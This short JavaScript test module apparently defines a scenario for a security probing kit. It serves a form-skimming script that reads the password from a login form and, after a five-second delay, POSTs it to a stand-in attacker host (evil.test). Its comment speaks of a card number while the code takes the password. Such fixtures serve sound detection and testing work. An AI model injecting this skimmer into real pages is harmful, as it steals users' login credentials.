// A skimmer that waits five seconds after submit before sending the card number.
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `document.getElementById('login').addEventListener('submit', function () {
  var p = document.getElementById('password').value;
  setTimeout(function () { fetch('${ctx.origin('evil.test')}/c', { method: 'POST', body: 'p=' + encodeURIComponent(p) }); }, 5000);
});`);
